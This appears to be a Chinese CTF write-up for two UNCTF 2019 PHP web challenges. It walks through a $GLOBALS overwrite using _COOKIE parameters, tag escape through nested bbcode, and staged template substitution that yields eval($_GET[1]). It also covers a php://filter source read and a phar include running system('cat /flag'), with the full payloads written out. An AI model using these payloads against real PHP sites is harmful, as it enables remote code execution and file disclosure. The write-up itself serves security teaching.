![](https://ctfwp.wetolink.com/2019unctf/best_language/95a8b27304c527dc2552e453e5bf9cfd.png)

翻翻源码，在 parse_template.php 中可以看到这几行：

![](https://ctfwp.wetolink.com/2019unctf/best_language/43d893dbe17f2a2edccf4ea1def7992a.png)

这里执行了 $strIf，我们网上看看，可以发现 strIf 是从 $iar 获取的，$iar 又是从
$content 中匹配得来的，$content
是函数的参数，先不看具体的逻辑，我们看看哪里调用了这个函数。

![](https://ctfwp.wetolink.com/2019unctf/best_language/ef0dd43bf938adc12e5ae3af1efd82ec.png)

Parse_again 调用了，这里的参数看起来都没有可控的。这里有个全局变量，第一个是：

![](https://ctfwp.wetolink.com/2019unctf/best_language/3ba5ddcca788593fca0a183bcd38f704.png)

是获取 html的值。

第二个：

![](https://ctfwp.wetolink.com/2019unctf/best_language/5bb946477ef3cb66ba4a16bc7c0e1091.png)

这里的 searchword 是从另一个字符串中匹配出来的，看起来好像没有可控的地方。

我们在 index.php 最上面发现引入了三个文件

![](https://ctfwp.wetolink.com/2019unctf/best_language/a6146f857cb828324571ad2c7801db5b.png)

看看 common.php，common.php 中上面是两个函数，下面是注册变量的代码：


![](https://ctfwp.wetolink.com/2019unctf/best_language/7b6c5c7cfaf9711adaa0b68c749b71ef.png)



这里注册了 _GET,_POST和_COOKIE 到变量里，但是在 check_var
中判断了禁止GLOBAS，所以不能直接传递 GLOBALS，我们分析一下
check_var：传进去的数组中key值不能是_GET,_POST 和 GLOBALS
这三个值，但是这里没有过滤
_COOKIE，我们可以传递这样一个get参数：_COOKIE[GLOBALS]=1

这样当第一次循环 _GET 时，_COOKIE 会被覆盖，第三次执行 _COOKIE 时就覆盖了
$GLOBALS了。

回到 index.php ：

![](https://ctfwp.wetolink.com/2019unctf/best_language/a062c43500acc7b09bb87f7a42f14851.png)

这里是 `$GLOBALS['GLOBALS']['content']`，也是我们可控的了。这个参数还经过了
parse_code，我们看看这个函数：

![](https://ctfwp.wetolink.com/2019unctf/best_language/45129cb932c1d9f5291546de629b825c.png)

执行了 $tag_parse_func 数组里的函数：

![](https://ctfwp.wetolink.com/2019unctf/best_language/868d0c4be4f429c8e412a709586a4c0a.png)

![](https://ctfwp.wetolink.com/2019unctf/best_language/60dccd5e815c17d1414c55b92186d8c8.png)

就是一段 bbcode，比如将 [b]abc[/b] 替换成 <b>abc</b>

我们再看看 index.php
中那两个注释，不难判断出这里应该是有些漏洞，可以导致标签逃逸，类似 xss的效果。

我们可以看到整个代码都做了 htmlentities 除了，只有一处：

![](https://ctfwp.wetolink.com/2019unctf/best_language/730ca14eece18032eaacbd40f7b98dbd.png)

但是这里被引号括起来了，上面又把引号替换成空了，所以单靠这里貌似也不行。于是我们留意到最后一个函数：

![](https://ctfwp.wetolink.com/2019unctf/best_language/66ce872c12a71d7a02dcc79ca0f329f4.png)

![](https://ctfwp.wetolink.com/2019unctf/best_language/3faf6a0add29528e95a7b871214e17d0.png)

这个函数就是将 [video][/video] 替换成 <video> 标签，其中判断了 host 必须是
youtube。还可以添加一些参数值。比如：

![](https://ctfwp.wetolink.com/2019unctf/best_language/43f07ca08b41a63d58b414f77707eee5.png)

![](https://ctfwp.wetolink.com/2019unctf/best_language/78603e645687a8cba92b024832ef6af1.png)

比如我们传进：[video]http://www.youtube.com?V=123[/video] 最后就会被替换成
`<video src='https://www.youtube.com/embed/123'></video>`

但是我们可以发现

![](https://ctfwp.wetolink.com/2019unctf/best_language/f3e94fd8a13e30321bb9cb671776d01a.png)

按顺序来的话，是先执行 video 解析，然后再 url解析。那么如果我们的
video传进的是：

`[video]http://www.youtube.com?v=[url]1234[/url][/video]`

先解析 video，就会变成：

`<video src='https://www.youtube.com/embed/[url]1234[/url]></video>`

然后解析 url：

```
<video src='https://www.youtube.com/embed/<a
href='1234'>1234</a>></video>
```

到这里，会发现 video 的 src
这个属性被提前闭合了，1234逃逸出来了，我们可以利用这点，把1234变成：

`></video><search>haha</search>`

然后解析成
```
<video src='https://www.youtube.com/embed/<a
href='></video><search>haha</search>'>1234</a>></video>
```


看起来我们的 search 标签成功逃逸出来了。

最终我们的payload是：
```
?_COOKIE[GLOBALS][GLOBALS][content]=[video]http://www.youtube.com?v=[url]></video><search>ceshi</search>[/url][/video]
```
我们可以在本地调试输出一下：

![](https://ctfwp.wetolink.com/2019unctf/best_language/d20df4c63256464ea4470bd35d907c02.png)

然后这个search 标签中的值会被带入进 parse_again
函数中。现在我们就可以来分析分析这里了。

![](https://ctfwp.wetolink.com/2019unctf/best_language/389c1f6c0007d8054b5212aa2cb04269.png)

首先分析分析parseIf 的函数，这大概就是在 $content 中匹配 `{if:abcd}1234{end if}`
这样的值，然后把 abcd的这个地方的值拿出来 eval，我们假设一下，我们可以把
template 里的值直接替换成 `{if:phpinfo()}1234{end if}`，这样就能执行了，再看看我们可以控制 template 里的哪里。

回到 parse_again 这个函数，GLOBALS
里的值我们是可控的，所以我们可以控制五个变量。但是这五个变量都被限制了，首先经过了
RemoveXSS，然后又截断了20位。我们先看看 RemoveXSS，在 common.php 中：

![](https://ctfwp.wetolink.com/2019unctf/best_language/a25d117e7a44e788f89b52a1716eb99f.png)

这里大概就是说如果匹配到了不允许的字符串，就在前两位加上 `<x>`，而我们最重要的
if: 也在里面。

这个分析完，再回到 parse_again

![](https://ctfwp.wetolink.com/2019unctf/best_language/63017bcd0d20222507804f2c43211357.png)

我们可以看到这里是顺序替换的，换种思路，我们是不是可以在 searchword 中带有
searchnum，比如：

模板文件中：

![](https://ctfwp.wetolink.com/2019unctf/best_language/c324cb7c21964fe51ca405fd9208a01a.png)

这是我们最先要替换的，替换成 $searchword，

我们把 $searchword 的值设为 `1{haha:searchnum}`，那么下次替换 $searchnum
的时候，比如我们的 searchnum 的值是 2，那么替换完就是 12，如果我们的1是
if，而他removexss 匹配得是 if: (if+冒号)，这时候就不会被检测到。

也就是说我们可以一点一点替换，最后达到：`{if:phpinfo()}1234{end if}`

给出我们的payload：

```
_COOKIE[GLOBALS][GLOBALS][content]=[video]http://www.youtube.com?v=[url]></video><search>{if{haha:searchnum}}</search>[/url][/video]

_COOKIE[GLOBALS][searchnum]=:eva{haha:type}

_COOKIE[GLOBALS][type]=l($_G{haha:typename}

_COOKIE[GLOBALS][typename]=ET[1])

1=phpinfo();
```

首先，我们匹配到的searchword是`{if{haha:searchnum}}`，然后进行替换，

一开始模板中的值为 `{haha:searchword}`，

第一次把 searchword替换上去后，值变成了：`{if{haha:searchnum}}`

然后第二次会替换 searchnum，变成了：`{if:eva{haha:type}}`

第三次替换 type：`{if:eval($_G{haha:typename}}`

最后一个替换typename：`{if:eval($_GET[1])}`

这就完成了，然后这个值会被传到 parseIf 中，通过正则表达式匹配出来，

![](https://ctfwp.wetolink.com/2019unctf/best_language/8618d098e1cdb1971782003f8e1dfa64.png)

因为 `{end if}` 在模板中其他位置是有的， 所以我们不用构造。

匹配出来的值就是`eval($_GET[1])`，然后被带入到 eval中，执行代码：

![](https://ctfwp.wetolink.com/2019unctf/best_language/1ee34114765e62616f55d8b7a76288f8.png)


### 这好像不是上传
#### 原理知识
1）	Php的webshell的基础知识,就是eval函数将得到的字符串当作了命令处理了
2）	利用phar包含自定义的脚本

#### 解题过程
步骤：

1.  打开靶机，出现这样一个页面

![](https://ctfwp.wetolink.com/2019unctf/not_upload/52e18a9254207f5b2bac996484ec653f.png)

1.  根据提示后,考虑到有隐藏信息,随后在源码中发现提示

![](https://ctfwp.wetolink.com/2019unctf/not_upload/dd3dab6c35c6bc4110e1dbd9d911ca17.png)

1.  可以发现一个文件包含的功能,于是查看了something.php

![](https://ctfwp.wetolink.com/2019unctf/not_upload/592afcee0aefe8d568da8b4dd87a1ed3.png)

1.  继续访问upload.php,得到一下内容.

![](https://ctfwp.wetolink.com/2019unctf/not_upload/1f99a809a6cb552bba40fe2a8ffe35d4.png)

1.  尝试上传,发现又能上传txt的文件,即使上传其他文件后,文件后缀也会被改为txt文件,

2.  在这里选手可能会想到通过index的文件包含进行攻击,但是当使用index的文件包含的时候,会出现如下提示

![](https://ctfwp.wetolink.com/2019unctf/not_upload/d864a671b9af88cf9c6c2dee9db5fbaa.png)

1.  在这里需要选手发现upload文件里面也有注释提示,因为考虑了新生水平,这里直接给出了考点为phar,需要选手自行搜索关于phar的知识

![](https://ctfwp.wetolink.com/2019unctf/not_upload/548927085f0c617d1a9de1a60e71111f.png)

1.  当选手知道phar是什么之后,会想到哪里有包含,这个时候很容易想到index里面有包含,但是index源码禁止了phar协议,而且做出了足够提示有东西在upload.php里面

![](https://ctfwp.wetolink.com/2019unctf/not_upload/d4dabe7d0d0e7353abc1831835ea8d59.png)

![](https://ctfwp.wetolink.com/2019unctf/not_upload/1301f5aca7f27342d9eb3246d97ae94a.png)

1.  所以选手需要知道upload.php里面还有东西,又考虑到index.php的包含功能,可以采用php://filter协议读取任意文件,我们这个时候读取upload.php的源码(payload:
    php://filter/convert.base64-encode/resource=upload.php)

![](https://ctfwp.wetolink.com/2019unctf/not_upload/5973983b5a8f2d903ca496182a8a6b6c.png)

1.  Base64解密后,可以发现upload的所有源码,其中也有一个没有限制的文件包含

![](https://ctfwp.wetolink.com/2019unctf/not_upload/5242ef90ca083e465b59abcd43624ff0.png)

1.  所以了解phar和webshell是什么后,我们思路就清晰了,这个时候上传我们的phar文件

![](https://ctfwp.wetolink.com/2019unctf/not_upload/d54d288a2b8b8962c7d8d821724bc730.png)

1.  利用upload的里面的file包含我们的文件(其中包含 `<?php echo system(“cat /flag”));?>`),即可拿到flag

![](https://ctfwp.wetolink.com/2019unctf/not_upload/319549cb068274f08c3a46d76e032b31.png)